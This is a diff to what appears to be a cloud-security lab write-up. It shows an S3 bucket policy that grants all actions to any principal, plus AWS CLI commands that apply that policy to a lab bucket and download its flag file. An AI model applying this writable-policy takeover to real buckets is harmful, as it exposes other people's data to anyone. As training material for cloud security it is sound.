@@ -28,7 +28,7 @@ The policy allows to put bucket policy. Create a file to update the policy.
     "Principal": {
      "AWS": "*"
     },
-    "Resource": "arn:aws:s3:::s3-writable-policy-157363981057"
+    "Resource": "arn:aws:s3:::s3-writable-policy-147461436620"
   },
    {
      "Action": "s3:*",
@@ -36,14 +36,24 @@ The policy allows to put bucket policy. Create a file to update the policy.
      "Principal": {
      "AWS": "*"
      },
-     "Resource": "arn:aws:s3:::s3-writable-policy-157363981057/*"
+     "Resource": "arn:aws:s3:::s3-writable-policy-147461436620/*"
     }
   ],
   "Version": "2012-10-17"
 }
 ```
 
+Update the new policy for the bucket and try downloading the flag object.
 
+```
+aws s3api put-bucket-policy --bucket s3-writable-policy-147461436620 --policy file://policy.json --profile PTAcademyJllerena
+aws s3 cp s3://s3-writable-policy-147461436620/flag ./ --profile PTAcademyJllerena
+cat flag
+
+```
+![image](https://user-images.githubusercontent.com/46797181/227661636-0620daab-afe2-4b7a-bdd1-e6c6222daa2b.png)
+
+EXERCISE COMPLETED !!!
 
 
 
